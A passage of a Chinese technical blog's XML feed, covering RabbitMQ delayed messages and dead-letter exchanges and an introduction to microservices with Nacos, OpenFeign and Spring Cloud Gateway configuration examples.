总结一下：</p><p>如何保证支付服务与交易服务之间的订单状态一致性？</p><ul><li><p>首先，支付服务会正在用户支付成功以后利用 MQ 消息通知交易服务，完成订单状态同步；</p></li><li><p>其次，为了保证 MQ 消息的可靠性，我们采用了发送者确认机制、消费者确认、消费者失败重试等策略，确保消息投递和处理的可靠性。同时也开启了 MQ 的持久化，避免因服务宕机导致消息丢失；</p><blockquote><p>保证消费者至少消费一次。</p></blockquote></li><li><p>最后，我们还在交易服务更新订单状态时做了业务幂等判断，避免因消息重复消费导致订单状态异常。</p></li></ul><p>上面的策略已经比较完善了，但是还是可能存在问题：我们的机制没有问题，但是网络原因，MQ 和消费者间真的一直都没办法建立连接，能否有个兜底机制，至少确保关键的业务（例如支付）数据一致性？</p><h2 id="2-5-延迟任务和延迟消息"><a href="#2-5-延迟任务和延迟消息" class="headerlink" title="2.5 延迟任务和延迟消息"></a>2.5 延迟任务和延迟消息</h2><p>延迟任务是消息一致性的一种兜底方案。</p><p>延迟消息：<strong><u>发送者发送消息时指定一个时间，消费者不会立刻收到消息，而是在指定时间之后才收到消息。</u></strong></p><p>以下单举例：</p><p><img src="imgs/delay-example.png" width="600px"></p><p>假设交易服务和支付服务间暂时一直无法连接，是否有机制确保二者间的消息一致？</p><p>我们可以引入超时时间的概念，一段时间后，再次向支付服务查询如果成功就改变状态；如果失败则取消。</p><p>在 Rabbit MQ 中可以借助插件来完成延迟任务（默认不支持）。</p><h3 id="2-5-1-死信交换机（dead-letter）"><a href="#2-5-1-死信交换机（dead-letter）" class="headerlink" title="2.5.1 死信交换机（dead-letter）"></a>2.5.1 死信交换机（dead-letter）</h3><p>当一个队列中的消息满足下列情况之一时，就会成为死信（dead letter）：</p><ul><li>消费者使用 <code>REJECT</code> 或 <code>NACK</code> 声明消费失败并且消息的 <code>requeue</code> 参数设置为 <code>false</code> / 使用失败重试机制的 Message Recoverer 是 <code>RejectAndDontRequeueRecoverer</code>；</li><li>消息是一个过期消息（达到了队列或消息本身设置的过期时间），超时无人消费；</li><li>要投递的队列消息堆积满了，最早的消息可能成为死信；</li></ul><p>我们可以在声明交换机时，给定一个属性 <code>dead-letter-exchange</code>，并且与某个队列绑定，那么该队列中的死信就会自动投递到这个交换机中；</p><p>我们可以利用死信交换机的 “超时” 特性，实现延时任务：</p><p><img src="imgs/dead-letter-meme-delay.png"></p><p>我们可以对某个队列声明死信交换机，直接使用 <code>QueueBuilder</code> 的方式定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QueueBuilder</span><br><span class="line">    .durable(&lt;queue name&gt;)</span><br><span class="line">    .deadLetterExchange(&lt;dlx exchange name&gt;)</span><br><span class="line">    .build()</span><br></pre></td></tr></table></figure><p>最后，我们还有在发送消息时还需要指定消息的过期时间，确保最终以规定时间进入死信交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitTemplate.convertAndSend(&lt;normal direct&gt;, &lt;key&gt;, &lt;object&gt;, &lt;post process&gt;)</span><br></pre></td></tr></table></figure><p>在最后一个参数中，传入一个 <code>MessagePostProcessor</code> 函数接口的实现，即可在 object 转换为 <code>Message</code> 对象后再进行处理，以设置超时时间。因为<strong><u>超时时间也位于 Message 的 Properties 中</u></strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">MessagePostProcessor</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Message <span class="title function_">postProccessMessage</span><span class="params">(Message message)</span> <span class="keyword">throws</span> AmqpException &#123;</span><br><span class="line">        message.getMessageProperties().setExpiration(<span class="string">&quot;10000&quot;</span> <span class="comment">/* 字符串表示的 ms */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 也可以换成 lambda 表达式 */</span></span><br></pre></td></tr></table></figure><h3 id="2-5-2-Rabbit-MQ-延时任务插件"><a href="#2-5-2-Rabbit-MQ-延时任务插件" class="headerlink" title="2.5.2 Rabbit MQ 延时任务插件"></a>2.5.2 Rabbit MQ 延时任务插件</h3><p>需要在 <code>mq-plugins/_data</code> 中加入插件，并且配置 <code>enabled_plugins</code> 文件，加入 <code>rabbitmq_delayed_message_exchange</code> 即可；</p><p>然后，我们需要设置某个交换机的属性为 <code>delayed</code>：</p><ul><li>如果使用 Bean 配置，那么就用 <code>ExchangeBuilder</code> 添加 <code>delayed()</code> 方法；</li><li>如果使用 <code>@RabbitListener(bindings)</code> 的配置，就在 <code>@Exchange</code> 中加入 <code>delayed = &quot;true&quot;</code>；</li></ul><p>最后给要发送的消息指定 properties <code>x-delay</code>，同样使用 post processor，此时对 Message Properties 调用 <code>setDelay(&lt;ms&gt;)</code> （不是 <code>setExpiration</code>）即可；</p><blockquote><p>注意：无论是延时消息，还是死信的生成，其计时依赖 CPU 时钟，所以是 CPU 密集型任务。</p><p>如果超时时间 / 过期时间设置过长，都会导致需要计时的消息大量积压，影响 MQ 性能。</p><p><strong><u>所以无论是死信交换机中的过期时间，还是延时任务的延时时间，都不宜设置过长。</u></strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-0-背景&quot;&gt;&lt;a href=&quot;#Chapter-0-背景&quot; class=&quot;headerlink&quot; title=&quot;Chapter 0. 背景&quot;&gt;&lt;/a&gt;Chapter 0. 背景&lt;/h1&gt;&lt;h2 id=&quot;0-1-同步消息和异步消息&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="MQ" scheme="https://blog.sjtuxhw.top/tags/MQ/"/>
    
    <category term="Web" scheme="https://blog.sjtuxhw.top/tags/Web/"/>
    
    <category term="Microservice" scheme="https://blog.sjtuxhw.top/tags/Microservice/"/>
    
  </entry>
  
  <entry>
    <title>微服务初探</title>
    <link href="https://blog.sjtuxhw.top/technical/micro-service-basic/"/>
    <id>https://blog.sjtuxhw.top/technical/micro-service-basic/</id>
    <published>2024-05-21T03:27:40.000Z</published>
    <updated>2024-10-25T14:02:45.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-0-基本概念"><a href="#Chapter-0-基本概念" class="headerlink" title="Chapter 0. 基本概念"></a>Chapter 0. 基本概念</h1><ul><li>微服务是一种软件架构风格。专注于单一职责的小型业务为基础，组成复杂大型应用。</li><li>需要解决的问题：服务拆分、远程调用（RPC）、服务治理（可用性与调度）、请求路由、身份认证、配置管 理、分布式事务（一致性问题）、异步通信……</li><li>优点和特征：粒度小、单服务开发便捷，团队自治，服务自治，系统耦合性低；</li><li>缺点：跨模块开发难度大，运维成本高；</li></ul><blockquote><p>对比而言，单体架构：</p><ul><li>优点：架构简单、部署成本低（适用于开发功能相对简单、规模较小的项目）；</li><li>缺点：团队协作成本高，系统发布效率低、系统可用性差（软件可靠性差）；</li></ul></blockquote><ul><li>对应框架：Spring Cloud，全球范围广泛使用的微服务框架；<ul><li>服务注册发现组件：Eureka、Nacos、Consul……</li><li>服务远程调用（RPC）；OpenFeign、Dubbo……</li><li>服务链路监控：Zipkin、Sleuth……</li><li>统一配置管理：Spring Cloud Config、Nacos……</li><li>统一网关路由：Spring Cloud Gateway、Zuul……</li><li>流控、降级、保护：Hystix、Sentinel……</li></ul></li></ul><h1 id="Chapter-1-基于实践学习：将单体架构拆分"><a href="#Chapter-1-基于实践学习：将单体架构拆分" class="headerlink" title="Chapter 1. 基于实践学习：将单体架构拆分"></a>Chapter 1. 基于实践学习：将单体架构拆分</h1><h2 id="1-1-基本思路"><a href="#1-1-基本思路" class="headerlink" title="1.1 基本思路"></a>1.1 基本思路</h2><ul><li>拆分时机：<ul><li>创业项目：先使用单体架构，快速开发、试错；规模扩大后再拆分；</li><li>确定的大型项目：资金充足，目标明确，直接选择微服务架构；</li></ul></li><li>拆分原则：<ul><li>高内聚：每个微服务的职责尽量单一，包含的业务相互关联度高、<strong>完整度高</strong>；</li><li>低耦合：每个微服务的功能要相对独立，尽量减少对其他微服务的依赖；</li></ul></li><li>拆分方式：<ul><li>纵向拆分：按业务模块拆分（用户认证管理、订单管理……）；</li><li>横向拆分：抽取公共服务，提高复用性（用户登录、订单管理中有公共服务，例如风控、日志服务）；</li></ul></li></ul><blockquote><p>具体如何拆分何种模式？</p><ul><li><p>独立 Project：一个单体架构的项目拆分后，将每个 service 放在一个独立 Project 内；</p><p>优点：相当解耦，关联度更低；</p><p>缺点：对于小型项目而言仓库管理臃肿费力；</p><p>适用：大型项目，每个 service 的业务逻辑相当复杂；</p></li><li><p>Maven 聚合：一个单体项目拆分后，所有 service 都存放在一个 project 中，这个 project 专门用于管理依赖，每个 service 都是 project 的一个 module；</p><p>适用：中小型项目，敏捷开发；</p></li></ul></blockquote><h2 id="1-2-远程调用-RPC：以-Spring-RestTemplate-为例"><a href="#1-2-远程调用-RPC：以-Spring-RestTemplate-为例" class="headerlink" title="1.2 远程调用 RPC：以 Spring RestTemplate 为例"></a>1.2 远程调用 RPC：以 Spring <code>RestTemplate</code> 为例</h2><p>拆分的问题：经常会遇到一个服务依赖另一个服务的情况。这可以直接通过服务间远程调用（RPC）来完成。</p><blockquote><p>远程调用 RPC 更像是一种软件协议，能<strong><u>让一个程序和本地执行流程一样，在远端执行一段代码</u></strong>。</p><p>在软件工程原理的 23 个设计模式中，更像是利用了 Proxy 设计模式。调用者无需关心远程信息交互的具体细节，只需按照接口像调用本地服务一样即可完成目标。</p></blockquote><p>在 Spring 中，一种轻量级的远程调用的方法是，使用接口：<code>RestTemplate</code>，调用它就相当于在 Java 代码中向 RESTful API 发送网络请求并且获取回复。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; ResponseEntity&lt;T&gt; <span class="title function_">exchange</span><span class="params">(</span></span><br><span class="line"><span class="params">    String url,</span></span><br><span class="line"><span class="params">    HttpMethod method,</span></span><br><span class="line"><span class="params">    <span class="meta">@Nullable</span> HttpEntity&lt;?&gt; requestEntity,    <span class="comment">/* request body */</span></span></span><br><span class="line"><span class="params">       Class&lt;T&gt; responseType,</span></span><br><span class="line"><span class="params">    Map&lt;String, ?&gt; uriVariables</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>规避类型擦除：<code>new ParameterizedTypeReference&lt;T&gt;() &#123;&#125;</code>；</p></blockquote><p>但是有一些不可避免的问题：</p><ul><li>若代码中写死 <code>url</code>，则 负载均衡、可用性轮换等等策略全部失效；</li><li>若业务逻辑中的远程调用的部分较多，则 <code>RestTemplate</code> 对象散落各处不方便维护；</li><li>……</li></ul><p>于是我们需要更严格、复杂的架构将服务间的远程调用管理起来。一种思路就是 “<strong><u>发布-订阅者模式</u></strong>”；</p><h2 id="1-3-微服务的注册与发现机制"><a href="#1-3-微服务的注册与发现机制" class="headerlink" title="1.3 微服务的注册与发现机制"></a>1.3 微服务的注册与发现机制</h2><h3 id="1-3-1-发布-订阅模式（架构）"><a href="#1-3-1-发布-订阅模式（架构）" class="headerlink" title="1.3.1 发布-订阅模式（架构）"></a>1.3.1 发布-订阅模式（架构）</h3><p>发布-订阅者模式（pub-sub pattern）；</p><p><img src="imgs/pub-sub.png"></p><p>The Pub/Sub (Publisher/Subscriber) model is a messaging pattern used in software architecture to facilitate asynchronous communication between different components or systems. In this model, publishers produce messages that are then consumed by subscribers.</p><p>发布-订阅模型，作为一种消息传递模式，用在一些软件架构中，来实现不同组件、系统间的<strong><u>异步通信</u></strong>。</p><ul><li><p>subscribers：消息的获取方，publishers：消息生产方；</p></li><li><p>topics：一种订阅频道 / 分类（channels / categories）；</p><p>发布者可以按照消息的业务含义为消息打上话题标签（并且无需知道订阅者的特性），而订阅者可以按照 topics 来订阅、获取部分感兴趣的消息（并且无需知道发布者的特性）；</p><p>Topics help categorize messages and enable targeted message delivery to interested subscribers.</p></li><li><p>message brokers：一种中间件/中间人（intermediaries），负责在 publishers 和 subscribers 间使用合适的策略传递消息（调度队列、延时……）；</p><ul><li>message brokers 可以按 topics 维护一些消息队列；</li><li>确保消息发送给正确的订阅者，并且提供额外的特性：<strong><u>消息持久化、可扩展性、可靠性</u></strong>；</li></ul></li><li><p>message：可以是任何形式的数据信息（text, JSON, binary, etc）；</p></li><li><p>subscription：订阅代表了 subscriber 和某个 topics 建立的一个关联。它定义了：</p><ul><li>订阅者订阅了什么 topic 的消息；</li><li>订阅设置，例如是否事务、是否有订阅内容保证（at-most-once / at-least-once）等等；</li></ul></li></ul><p>发布-订阅模型的理论过程：</p><ol><li>发布者创建并发送消息给 pub/sub system，并且根据消息内容类型放入指定 topic 或者说 channel 中；</li><li>订阅者向 pub/sub system 表达需要订阅某个/些 topic 的意愿，有信息就会收到；</li><li><p>message brokers 根据收到发布者的 topic 对收到的消息分类，再根据所有 topics 的订阅情况 forward 给所有订阅了这个 topic 的 subscribers；</p></li><li><p>以上过程全部异步，发布者不需要关心订阅者的状态即可发布；订阅者无需关心发布者的状态即可接受消息。</p></li></ol><p>发布-订阅模型的优势：</p><ul><li>decoupling &amp; scalability：将消息生产方和消息接受方解耦，不仅无需关心对方状态和交互细节，而且 scalable，便捷地增减 publishers 和 subscribers 的数量而无需影响现有组件；</li><li>asynchronous communication：异步通信能力；</li><li>event-driven architecture：发布者和订阅者互不耦合，但发布者的事件行为可以影响订阅者；</li><li>dynamic subscription：允许运行时动态更换订阅，去耦合，全面的灵活性；</li></ul><p>发布-订阅模型的适用场景：</p><ul><li>消息队列系统；</li><li>需要构建 scalable web app 的时候，尤其是在线文档、实时更新的场景；</li><li>微服务架构间的远程通信；</li><li>……</li></ul><p>发布-订阅模型不应该使用的场景：</p><ul><li>对交互时延有极强需求的场景，例如游戏；</li><li>低复杂度的交互场景，例如系统只有两个组件间的交互，贸然引入会增大不必要的复杂度；</li><li>……</li></ul><p>回到微服务远程调用的主题上。为了确保服务远程调用的灵活性、可用性，我们可以借鉴 发布-订阅者模式，通过注册、发现、订阅的流程，动态调度服务的访问方式。</p><p>这样既可以有效地、统一地管理远程访问，提升可维护性，又可以便捷地进行调度，充分利用服务资源。</p><h3 id="1-3-2-注册中心"><a href="#1-3-2-注册中心" class="headerlink" title="1.3.2 注册中心"></a>1.3.2 注册中心</h3><p>在微服务架构中，规避微服务间直接远程调用缺陷的一种方式就是引入注册中心机制，借鉴发布-订阅模式，引入注册中心后的主要步骤如下：</p><ol><li>服务发布者向注册中心注册服务信息（提供何种服务，即 topic，还有地址在哪里）；</li><li>服务订阅者向注册中心订阅感兴趣的服务。此时注册中心可以将<strong><u>当前可用的</u></strong>发布者信息告诉订阅者；</li><li>订阅者（或者注册中心）可以进行负载均衡，选择一个发布者向其请求服务（远程调用）。</li></ol><p>由于我们利用了发布-订阅模式，所以即便是已经获取服务列表的订阅者，也能从注册中心实时获取当前发布者的可用情况。例如：</p><blockquote><p>假设订阅者从注册中心获取了 3 个可能的服务发布者，但是一段时间后其中一个服务提供方 A 宕机。</p><p>这个时候 A 不再通过注册中心的 health check（heart beat），注册中心认为 A 不再有效，于是向所有订阅了 A 服务所在 topic 的所有订阅者推送变更。</p><p>这就保证了订阅者订阅列表的有效性。创建了新的服务实例也是如此！实现了 scalable service，随意增减服务实例数量、负载均衡。</p></blockquote><hr><p>在代码方面，我们知道在 Spring Cloud 中，注册中心有很多实现，例如 Alibaba 的 Nacos，Netflix 的 Eureka。我们就以其中的 Nacos 为例。我们只需要将注册中心部署在固定 IP 的服务器上即可。</p><p>配置好 Nacos，在注册服务客户端（也就是提供服务方）引入 nacos 注册发现服务，还需要对 Spring 进行配置，指定 registry server 的地址和需要的服务名。最后启动这个服务实例即可完成注册！</p><p>而在服务调用端，需要在项目中引入 Nacos Client，它实现了 Spring Cloud 的 <code>DiscoveryClient</code> 接口。</p><p>我们直接注入 <code>DiscoverClient</code>，使用如下方法：</p><ul><li><code>DiscoverClient.getInstances(String serviceName) -&gt; List&lt;ServiceInstance&gt;</code>，<code>serviceName</code> 是服务提供方在 Nacos 中注册的服务名；</li><li>而我们可以通过 <code>ServiceInstance</code> 获取 <code>uri / host / port</code> 信息，手动写负载均衡或其他处理工作。</li></ul><blockquote><p>注：Nacos 需要导入依赖 <code>spring-cloud-starter-alibaba-nacos-discovery</code>，并且进行配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">nacos.server-addr:</span> <span class="string">...</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="1-3-3-更优雅的远程调用：OpenFeign"><a href="#1-3-3-更优雅的远程调用：OpenFeign" class="headerlink" title="1.3.3 更优雅的远程调用：OpenFeign"></a>1.3.3 更优雅的远程调用：OpenFeign</h3><h4 id="初步认识-OpenFeign"><a href="#初步认识-OpenFeign" class="headerlink" title="初步认识 OpenFeign"></a>初步认识 OpenFeign</h4><p>但是这里有个问题，我们通过 <code>DiscoverClient</code> 获取可用服务列表，然后再处理一系列可能的异常，然后还要手写 <code>RestTemplate</code> 进行远程调用，最后才能访问服务！</p><p>如此繁琐的远程调用，我们应该进行封装！好在同样有框架能够更轻松地帮助我们完成远程调用：OpenFeign；</p><blockquote><p>注：我们还要对负载均衡算法进行封装。使用 Spring cloud load balancer 就能解决问题。</p></blockquote><p>引入 OpenFeign 的方法如下：</p><ul><li><p>引入 OpenFeign 依赖；</p></li><li><p>在 Springboot Application 启动类注解 <code>@EnableFeignClients</code> 启用 OpenFeign 的特性；</p></li><li><p>定义接口，用于指定要远程调用的服务名、远程调用服务名的 endpoint。举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;item-service&quot;)</span>    <span class="comment">/* 需要向注册中心申请的服务名 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ItemClient</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 告诉 OpenFeign 需要连接远程服务的 endpoint 相当于指定 RestTemplate 的 uri 和 HttpMethod */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/items&quot;)</span></span><br><span class="line">    <span class="comment">/* 告诉 OpenFeign 的传入参数、请求体信息，以及服务返回 JSON 对应的类型，相当于指定 RestTemplate 的 RequestEntity，responseType，uriVariables */</span></span><br><span class="line">    List&lt;ItemDto&gt; <span class="title function_">queryItemByIds</span><span class="params">(<span class="meta">@RequestParam(&quot;ids&quot;)</span> Collection&lt;Long&gt; ids)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>这样相当于实现了 proxy 设计模式（这个 interface 对应 Spring 生成的实例就是 proxy），在调用远程服务就像调用本地服务一样简单！</p><h4 id="OpenFeign-连接池优化"><a href="#OpenFeign-连接池优化" class="headerlink" title="OpenFeign 连接池优化"></a>OpenFeign 连接池优化</h4><p>OpenFeign 的底层实现非常类似我们手动使用 <code>DiscoverClient</code>，并且考虑负载均衡、服务异常的情况。</p><p>感兴趣的同学可以步进调试观察其底层行为。</p><p>值得注意的是，OpenFeign 底层默认的远程调用的方式是利用 <code>HttpURLConnection</code> 类（位于 <code>FeignBlockingLoadBalancerClient</code> 的 <code>delegate</code> 成员变量），而这个 Java 内置类比较底层，不支持连接池，不像 apache 的 <code>HttpClient</code> 和 <code>OkHttp</code>，可能造成资源利用率较低。</p><p>好在我们可以为 OpenFeign 的底层请求更换具有连接池的连接类，这样可以减小创建和销毁连接的开销，有助于提升程序性能。只需导入依赖相应依赖（例如 <code>feign-okhttp</code>），并且在 <code>application.yaml/properties</code> 中配置开启即可（例如 <code>feign.okhttp.enabled = true</code>）；</p><blockquote><p>注意，是在 OpenFeign 调用方模块设定才有效！</p></blockquote><h4 id="OpenFeign-最佳实践"><a href="#OpenFeign-最佳实践" class="headerlink" title="OpenFeign 最佳实践"></a>OpenFeign 最佳实践</h4><p>到这里仍然没有结束，我们还需要知道 OpenFeign 框架的最佳实践。</p><p>上面介绍引入 OpenFeign 的方法实际上是有严重问题的。我们发现，当单体架构的程序被拆成微服务后，有可能多个服务依赖同一个微服务，难不成所有用到的微服务都要定义一遍像 <code>ItemClient</code> 一样的接口？</p><p>我们知道，代码重复是大忌，这不仅降低了可维护性（增添维护人员心智负担）、可扩展性（修改繁琐，不对修改开发），还降低了代码可读性和正确性。</p><p>正确使用 OpenFeign 的方案有几种：</p><ul><li><p>直接交给服务提供方编写 Feign Client，将服务提供方拆成 3 个模块：</p><ul><li><code>DTO</code> 中包含向服务调用方返回的数据类型；</li><li><code>api</code> 中包含 <code>FeignClient</code> 接口以供调用；</li><li><code>blz</code> 中包含原先的代码业务逻辑；</li></ul><p>最后其他服务只需引用该服务为依赖即可。</p><p>优点：代码逻辑更合理，易于维护，耦合度更低；</p><p>缺点：项目结构更复杂、编写麻烦；</p></li><li><p>创建一个不属于任何一个微服务模块的、同级的 <code>api</code> module，专门管理 <code>FeignClient</code>，主要包含：</p><ul><li><code>client</code>：所有微服务想要向外暴露的 <code>FeignClient</code>；</li><li><code>config</code>：所有微服务的配置类；</li><li><code>dto</code>：所有微服务想要返回的数据类型；</li></ul><p>优点：项目结构清晰，无需改动原先微服务；</p><p>缺点：代码耦合度增加，每个微服务模块都需要引入该模块为依赖（而前一种方法只需引入需要用的模块就行），所有微服务都需要和 <code>api</code> 一起开发；</p><p>但是如果以这种方式创建 <code>FeignClient</code>，没法完成依赖注入（因为 Spring Application 没法自主扫描本包以外的 bean），就需要手动指定接口类型，并将其纳入 IoC Container 中。两种方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在 SpringApplication 启动类启用 FeignClient 时显示指定 bean 类型 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 方法一：为 Spring 指定 bean 扫描的包名（精确到子包） */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(basePackages = &lt;package name&gt;)</span></span><br><span class="line"><span class="comment">/* 方法二：利用反射手动指定 bean 对应接口的 Class 类型 */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(clients = &#123; &lt;classname&gt;.class &#125;)</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="OpenFeign-日志管理"><a href="#OpenFeign-日志管理" class="headerlink" title="OpenFeign 日志管理"></a>OpenFeign 日志管理</h4><p>OpenFeign 框架默认情况下仅在 <code>FeignClient</code> 所在包配置的日志级别为 <code>DEBUG</code> 时才会输出日志，并且自身的日志级别是 <code>NONE</code>（不输出），故需要我们手动配置。</p><blockquote><p>注：OpenFeign 自身的日志级别有 4 种：<code>NONE / BASIC / HEADERS / FULL</code>；</p></blockquote><p>定义 OpenFeign 的日志级别需要完成两件事：</p><ol><li><p>定义配置类，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 没有 @Configuration / @Service 等注解，该 @Bean 不会被纳入 IoC Container */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeignConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Logger.Level <span class="title function_">feignLogLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Logger.Level.FULL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将配置类配置给指定 / 全局的 <code>FeignClient</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 指定 FeignClient */</span></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;...&quot;, configuration = FeignConfig.class)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 全局 FeignClient 默认 */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(defaultConfiguration = FeignConfig.class)</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="1-4-微服务网关"><a href="#1-4-微服务网关" class="headerlink" title="1.4 微服务网关"></a>1.4 微服务网关</h2><p>在大致拆好微服务后，有个问题就随之出现：前端应该如何访问后端服务？难道前端还需要动态获取各个服务的地址？</p><p>肯定不能这样，我们的期望是前后端的解耦，就是说单体架构和微服务架构下，前端是无需改变的，只需要向固定的地址发送不同请求就能得到对应的响应，这就需要一个中间层来完成这个任务。</p><p>这个能将不同服务转发给某个符合条件的微服务的中间层就是网关。网关不仅能完成前面的 forward 的功能，还能<strong><u>配合注册中心</u></strong>进行负载均衡。</p><blockquote><p>功能：</p><ul><li>请求路由（路径针对什么微服务？）；</li><li>转发（帮忙将 HTTP 请求 forward 给某个动态地址的实例）；</li><li>身份校验（检查请求的 <code>Authorization</code> 是否合法）；</li></ul></blockquote><p>这样，我们就不需要在每个微服务中进行身份校验等繁琐工作了。更安全的是，后端微服务甚至不需要向外暴露端口了，只需暴露网关，大大增强安全性。</p><p>此外，引入网关后，后端实现了封装和解耦，在前端看来这和单体架构别无二致。</p><h3 id="1-4-1-微服务网关框架：Spring-Cloud-Gateway"><a href="#1-4-1-微服务网关框架：Spring-Cloud-Gateway" class="headerlink" title="1.4.1 微服务网关框架：Spring Cloud Gateway"></a>1.4.1 微服务网关框架：Spring Cloud Gateway</h3><div class="table-container"><table><thead><tr><th>Spring Cloud Gateway</th><th>Netflix Zuul</th></tr></thead><tbody><tr><td>基于 <code>WebFlux</code> 响应式编程</td><td>基于 <code>Servlet</code> 阻塞式编程</td></tr><tr><td>无需调优即有很好性能</td><td>需要调优才有接近Spring Cloud Gateway 的性能</td></tr><tr><td>正常维护</td><td>更新较慢</td></tr></tbody></table></div><p>基于上述特点，我们以 Spring Cloud Gateway 为例。</p><p>它的使用很简单：导入依赖、编写启动类、编写配置。</p><h4 id="Spring-Cloud-Gateway-配置示例"><a href="#Spring-Cloud-Gateway-配置示例" class="headerlink" title="Spring Cloud Gateway 配置示例"></a>Spring Cloud Gateway 配置示例</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">cloud:</span></span><br><span class="line">        <span class="attr">gateway:</span></span><br><span class="line">            <span class="attr">routes:</span><span class="comment"># 路由规则列表</span></span><br><span class="line">                <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&lt;Route</span> <span class="string">ID&gt;</span> <span class="comment"># 独一无二的路由 ID</span></span><br><span class="line">                  <span class="attr">uri:</span> <span class="string">lb://&lt;service</span> <span class="string">name&gt;</span> <span class="comment"># load balance，到指定服务</span></span><br><span class="line">                  <span class="attr">predicates:</span><span class="comment"># 筛选断言条件（列表）</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="string">Path=/xx/**</span><span class="comment"># 支持通配符</span></span><br><span class="line">                  <span class="attr">filters:</span></span><br><span class="line">                  <span class="bullet">-</span> [<span class="string">...</span>]<span class="string">=[...]</span></span><br><span class="line">            <span class="attr">default-filters:</span></span><br><span class="line">                <span class="bullet">-</span> [<span class="string">...</span>]<span class="string">=[...]</span></span><br></pre></td></tr></table></figure><p>众所周知，<code>application.yaml</code> 中的配置内容相当于 XML Bean，都在向 Spring 框架的类型中填写初始化属性罢了。这里 <code>spring.cloud.gateway.routes</code> 对应的是 <code>Collection&lt;RouteDefinition&gt;</code> 类型。</p><p>其中，<code>predicates</code> 属性可取以下值：</p><div class="table-container"><table><thead><tr><th>Name</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td>After</td><td>是某个时间点后的请求</td><td>After=2037-01-20T17:42:47.789-07:00[America/Denver]</td></tr><tr><td>Before</td><td>是某个时间点之前的请求</td><td>Before=2031-04-13T15:14:47.433+08:00[Asia/Shanghai]</td></tr><tr><td>Between</td><td>是某两个时间点之前的请求</td><td>Between=2037-01-20T17:42:47.789-07:00[America/Denver], 2037-01-21T17:42:47.789-07:00[America/Denver]</td></tr><tr><td>Cookie</td><td>请求必须包含某些cookie</td><td>Cookie=chocolate, ch.p</td></tr><tr><td>Header</td><td>请求必须包含某些header</td><td>Header=X-Request-Id, 